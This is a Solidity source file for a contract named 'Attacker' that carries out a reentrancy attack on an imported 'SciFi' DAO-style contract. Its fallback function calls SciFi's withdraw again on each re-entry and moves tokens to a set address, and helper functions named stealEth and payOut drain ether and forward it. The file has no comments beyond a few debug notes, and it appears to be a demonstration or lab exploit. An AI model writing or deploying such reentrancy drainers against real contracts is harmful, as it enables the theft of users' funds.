import "./SciFi.sol";

contract Attacker {
  event DefaultFunc(address caller, uint amount, uint num, uint daoBalance);

  address public scifiAddress;
  address public transferAddress;

  uint[] public arr;
  uint public a     = 0;

  function () payable {
    DefaultFunc(msg.sender,msg.value,a,SciFi(scifiAddress).balances(this)-1);
    while (a<5) {
        a++;
      arr.push(a); //to help debug
    //  if (scifiAddress.balance-2*msg.value < 0){
    if (a==4){
          SciFi(scifiAddress).transferTokens(transferAddress,SciFi(scifiAddress).balances(this)-1);
      }
      SciFi(scifiAddress).withdraw(this);
    }
  }

  //fund contract without calling the default function
  function fundMe() payable {
  }

  function stealEth(){
    SciFi(scifiAddress).withdraw(this);
  }

  function payOut(address _payee) returns (bool){
    if (_payee.send(this.balance))
    return true;
  }

  function buyDAOTokens(uint _amount){
    SciFi(scifiAddress).vote.value(_amount)('');
  }

  function resetA() {
    a               =0;
  }

  function setDAOAddress(address _dao){
    scifiAddress      =_dao;
  }
  function setTransferAddress(address _transferAddress){
    transferAddress =_transferAddress;
  }
}
